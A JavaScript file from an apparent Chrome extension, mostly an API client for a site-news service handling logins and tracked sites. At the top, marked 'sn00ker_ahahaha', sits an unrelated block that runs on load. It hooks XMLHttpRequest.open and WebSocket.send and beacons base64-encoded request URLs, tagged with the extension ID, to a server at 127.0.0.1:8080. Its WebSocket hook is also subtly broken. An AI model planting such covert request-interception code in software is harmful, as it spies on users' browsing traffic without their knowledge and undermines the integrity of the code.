function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
function getCniServerUrl() {
    return "https://www.sitesberg.com/cni/";
}


var CniConnector = function () {

    this.getNewsForSitesID = function (siteIDs, onEachSite) {

        if (siteIDs.length == 0) {
            return;
        }

        var urlParams = "?id=" + siteIDs[0];

        for (var i = 1; i < siteIDs.length; i++) {
            urlParams += "&id=" + siteIDs[i];
        }

        $.ajax({
            type: "GET",
            url: getCniServerUrl() + "webapi/sites/news" + urlParams,
            settings: {
                contentType: "application/json"
            },
            dataType: "json",
            success: function (data) {
                for (var i = 0; i < data.length; i++) {
                    onEachSite(data[i], i);
                }
            },
            error: function (data) {
                console.log(data);
            }
        });

    };

    this.querySite = function (urlParam, onSites, afterProcess) {

        var query = "?query=" + urlParam;

        $.ajax({
            type: "GET",
            url: getCniServerUrl() + "webapi/sites" + query + '&limit=30',
            settings: {
                contentType: "application/json"
            },
            dataType: "json",
            success: function (data) {
                onSites(data);
                afterProcess(data);
            },
            error: function (data) {
                console.log(data);
            }
        });

    };

    this.addSite = function (url, onEachSite, onError) {

        var request = {};

        request['url'] = url;

        $.ajax({
            type: "POST",
            url: getCniServerUrl() + "webapi/sites",
            contentType: "application/json",
            data: JSON.stringify(request),
            dataType: "json",
            success: function (data) {
                for (var i = 0; i < data.length; i++) {
                    onEachSite(data[i]);
                }
            },
            error: function (data) {
                onError(data);
            }
        });

    };

    this.loginViaGoogle = function (idToken, onSuccess, onError) {
        var request = {};

        request['access_token'] = idToken;

        $.ajax({
            type: "POST",
            url: getCniServerUrl() + "webapi/auth/google",
            contentType: "application/json",
            data: JSON.stringify(request),
            dataType: "json",
            success: function (data) {
                onSuccess(data);
            },
            error: function (data) {
                onError(data);
            }
        });

    };

    this.loginViaFacebook = function (accessToken, onSuccess, onError) {
        var request = {};

        request['access_token'] = accessToken;

        $.ajax({
            type: "POST",
            url: getCniServerUrl() + "webapi/auth/facebook",
            contentType: "application/json",
            data: JSON.stringify(request),
            dataType: "json",
            success: function (data) {
                onSuccess(data);
            },
            error: function (data) {
                onError(data);
            }
        });

    };

    this.loginViaCni = function (username, password, onSuccess, onError) {
        var request = {};

        request['username'] = username;
        request['password'] = password;

        $.ajax({
            type: "POST",
            url: getCniServerUrl() + "webapi/auth/cni/login",
            contentType: "application/json",
            data: JSON.stringify(request),
            dataType: "json",
            success: function (data) {
                onSuccess(data);
            },
            error: function (data) {
                onError(data);
            }
        });
    };


//Funkcja jako parametr przyjmuje funkcje z parametrami authToken, userid
    this.getUserData = function (onUserData) {

        localStorageClient.getUserId(function (userId) {
            localStorageClient.getAuthMethod(function (authMethodData) {
                var authMethod = authMethodData['AuthMethod'];
                if (authMethod == 'GOOGLE') {
                    chrome.identity.getAuthToken({
                        'interactive': false
                    }, function (accessToken) {
                        //jesli sie nie udalo - to nic nie rob
                        if (chrome.runtime.lastError) {
                            console.log(chrome.runtime.lastError);
                            return;
                        }
                        var authHeader = 'Bearer ' + accessToken;
                        onUserData(authHeader, userId['UserId']);
                    });
                } else if (authMethod == 'FACEBOOK') {
                    localStorageClient.getCachedAccessToken(function (accessTokenData) {
                        var authHeader = 'Bearer ' + accessTokenData['AccessToken'];
                        onUserData(authHeader, userId['UserId']);

                    });
                } else if (authMethod == 'CNI') {
                    localStorageClient.getEncodedUserData(function (basicAuth) {
                        var authHeader = 'Basic ' + basicAuth['EncodedUserData'];
                        onUserData(authHeader, userId['UserId']);
                    })
                } else {
                    onUserData();
                }
            })
        })
    };

    this.addUserSite = function (siteID, onSuccess, onError) {
        //wrapujemy w autoryzacje
        this.getUserData(function (authHeader, userId) {
            if (authHeader != undefined) {
                var request = {};

                request['id'] = siteID;

                $.ajax({
                    type: "POST",
                    url: getCniServerUrl() + "webapi/user/" + userId + "/sites",
                    headers: {
                        'Authorization': authHeader
                    },
                    contentType: "application/json",
                    data: JSON.stringify(request),
                    dataType: "json",
                    success: function (data) {
                        onSuccess(data);
                    },
                    error: function (data) {
                        clearAuthDataIfUnauthorized(data);
                        onError(data);
                    }
                });
            }

        });
    };

    this.removeUserSite = function (siteID, onSuccess, onError) {
        //wrapujemy w autoryzacje
        this.getUserData(function (authHeader, userId) {
            if (authHeader != undefined) {
                $.ajax({
                    type: "DELETE",
                    url: getCniServerUrl() + "webapi/user/" + userId + "/sites/" + siteID,
                    headers: {
                        'Authorization': authHeader
                    },
                    contentType: "application/json",
                    success: function (data) {
                        onSuccess(data);
                    },
                    error: function (data) {
                        clearAuthDataIfUnauthorized(data);
                        onError(data);
                    }
                });
            } else {
                onSuccess();
            }
        });
    };

    this.markAsRead = function (sites, onSuccess, onError) {
        var request = [];
        $.each(sites, function (idx, site) {
            var siteRequest = {};
            siteRequest['id'] = site.id;
            siteRequest['is_read'] = true;
            request.push(siteRequest);
        });

        this.getUserData(function (authHeader, userId) {
            if (authHeader != undefined) {
                $.ajax({
                    type: "PUT",
                    url: getCniServerUrl() + "webapi/user/" + userId + "/sites",
                    headers: {
                        'Authorization': authHeader
                    },
                    contentType: "application/json",
                    data: JSON.stringify(request),
                    dataType: "json",
                    success: function (data) {
                        onSuccess(data);
                    },
                    error: function (data) {
                        clearAuthDataIfUnauthorized(data);
                        onError(data);
                    }
                });
            }
        });
    };

    this.markAsUnread = function (sites, onSuccess, onError) {
        var request = [];
        $.each(sites, function (idx, site) {
            var siteRequest = {};
            siteRequest['id'] = site.id;
            siteRequest['is_read'] = false;
            request.push(siteRequest);
        });

        this.getUserData(function (authHeader, userId) {
            if (authHeader != undefined) {
                $.ajax({
                    type: "PUT",
                    url: getCniServerUrl() + "webapi/user/" + userId + "/sites",
                    headers: {
                        'Authorization': authHeader
                    },
                    contentType: "application/json",
                    data: JSON.stringify(request),
                    dataType: "json",
                    success: function (data) {
                        onSuccess(data);
                    },
                    error: function (data) {
                        clearAuthDataIfUnauthorized(data);
                        onError(data);
                    }
                });
            }
        });
    };

    this.addUserSiteBatch = function (siteIds, onSuccess, onError) {
        if (siteIds.length > 0) {
            //wrapujemy w autoryzacje
            this.getUserData(function (authHeader, userId) {

                var request = [];
                $.each(siteIds, function (i) {
                    request.push({"id": siteIds[i].id});
                });

                $.ajax({
                    type: "POST",
                    url: getCniServerUrl() + "webapi/user/" + userId + "/sites/_batch",
                    headers: {
                        'Authorization': authHeader
                    },
                    contentType: "application/json",
                    data: JSON.stringify(request),
                    dataType: "json",
                    success: function (data) {
                        onSuccess(data);
                    },
                    error: function (data) {
                        clearAuthDataIfUnauthorized(data);
                        onError(data);
                    }
                });
            });
        } else {
            onError("User's local storage don't contains any sites.");
        }
    };

    this.getUserSitesNews = function (onSiteNews, onError) {
        //wrapujemy w autoryzacje
        this.getUserData(function (authHeader, userId) {
            if (authHeader != undefined) {
                $.ajax({
                    type: "GET",
                    url: getCniServerUrl() + "webapi/user/" + userId + "/sites",
                    headers: {
                        'Authorization': authHeader
                    },
                    contentType: "application/json",
                    success: function (data) {
                        onSiteNews(data);
                    },
                    error: function (data) {
                        clearAuthDataIfUnauthorized(data);
                        onError(data);
                    }
                });
            }
        });
    };

    this.getUserAllSites = function (onSites, onError) {
        //wrapujemy w autoryzacje
        this.getUserData(function (authHeader, userId) {
            if (authHeader != undefined) {
                $.ajax({
                    type: "GET",
                    url: getCniServerUrl() + "webapi/user/" + userId + "/sites/_all",
                    headers: {
                        'Authorization': authHeader
                    },
                    contentType: "application/json",
                    success: function (data) {
                        onSites(data);
                    },
                    error: function (data) {
                        clearAuthDataIfUnauthorized(data);
                        onError(data);
                    }
                });
            }
        });
    };

    function clearAuthDataIfUnauthorized(data) {
        if (data.status == 401 && data.responseJSON.error_code == 5006) {
            localStorageClient.getAuthMethod(function (authMethodData) {
                var authMethod = authMethodData['AuthMethod'];
                if (authMethod == 'FACEBOOK') {
                    clear_cookies_associated_to_domain(extract_domain('https://www.facebook.com/'));
                }
                localStorageClient.clearAuthData();
            })
        }
    }
};


var cniApiClient = new CniConnector();

function getUserSitesAfterLogin() {
    cniApiClient.getUserAllSites(function (sites) {
        $.each(sites, function (index, site) {
            localStorageClient.saveSite(site, function () {
                //nothing to do
            });
        });
    }, function (errors) {
        renderText(errors);
    });
}

function pushUserSites() {
    localStorageClient.getAllSites(function (values) {
        cniApiClient.addUserSiteBatch(values, function () { // on success
            getUserSitesAfterLogin();
        }, function () { // on error
            getUserSitesAfterLogin();
        });
    });
}

function postLogin() {
    pushUserSites();
}
